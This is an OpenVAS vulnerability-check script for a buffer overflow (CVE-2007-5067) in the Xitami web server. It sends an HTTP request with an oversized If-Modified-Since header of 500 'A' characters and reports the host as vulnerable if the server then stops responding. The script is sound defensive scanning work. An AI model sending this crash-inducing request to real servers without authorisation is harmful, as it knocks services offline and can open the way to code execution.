###############################################################################
# OpenVAS Vulnerability Test
#
# Xitami Web Server If-Modified-Since Buffer Overflow Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802025");
  script_version("2019-11-29T11:42:42+0000");
  script_tag(name:"last_modification", value:"2019-11-29 11:42:42 +0000 (Fri, 29 Nov 2019)");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_bugtraq_id(25772);
  script_cve_id("CVE-2007-5067");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Xitami Web Server If-Modified-Since Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/26884/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/36756");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/4450");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17361");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17359");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_xitami_server_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("xitami/detected");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
  attackers to execute arbitrary code on the system or cause the application to crash.");

  script_tag(name:"affected", value:"iMatix Xitami Web Server Version 2.5c2 and 2.5b4, Other versions
  may also be affected.");

  script_tag(name:"insight", value:"The flaw is caused the way xitami web server handles
  'If-Modified-Since' header. which can be exploited to cause a buffer overflow by
  sending a specially-crafted parameter to 'If-Modified-Since' header.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running Xitami Web Server and is prone to buffer
  overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

CPE = "cpe:/a:imatix:xitami";

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
get_app_location(cpe:CPE, port:port);

useragent = http_get_user_agent();
host = http_host_name(port:port);

craftedReq = string("GET / HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", useragent, "\r\n",
                    "If-Modified-Since: ! ", crap(data:'A', length:500),
                    "\r\n\r\n");

res = http_send_recv(port:port, data:craftedReq);

sleep(1);

req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: Xitami" >!< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
